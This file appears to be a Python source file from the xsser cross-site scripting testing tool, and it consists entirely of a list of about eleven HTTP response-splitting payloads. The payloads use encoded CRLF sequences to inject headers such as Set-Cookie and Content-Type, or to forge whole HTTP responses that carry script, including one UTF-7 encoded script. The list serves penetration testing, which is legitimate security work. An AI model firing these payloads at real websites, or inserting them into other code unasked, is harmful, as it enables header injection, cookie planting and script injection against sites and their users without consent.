#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
$Id$

This file is part of the xsser project, http://xsser.03c8.net

Copyright (c) 2011/2016 psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different XSS fuzzing vectors.
## If you have some new, please email me to [epsylon@riseup.net]
## Happy Cross Hacking! ;)

HTTPrs_vectors = [
		{ 'payload' : """%0d%0AContent-Length:%200%0d%0A%0d%0AHTTP/1.1%20200%20OK%0d%0AContent-Length:%2016%0d%0A%0d%0A&lt;html&gt;XSS&lt;/html&gt;
			""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """XSS%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2029%0d%0a%0d%0a<script>alert("XSS")</script>""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0D%0ASet-Cookie%3AXSS""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0AContent-Type:html%0A%0A%3Cbody%20onload=alert(%22XSS%22)%3E""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0AContent-Type:text/html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0AContent-type:%20html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0AExpect:%20%3Cscript%3Ealert(%22XSS%22)%3C/script%3E""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified: Wed, 13 Jan 2006 12:44:23 GMT%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1""",
		  'browser' : """[Induced Injection]"""},
				
		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aCache-Control: no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1
			""",
                  'browser' : """[Induced Injection]"""},

		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aPragma:no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1
			""",
		  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0d%0AContent-Type: text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-alert('%58%53%53');%2BADw-/script%2BAD4-
			""",
                  'browser' : """[Induced Injection]""" }
		]

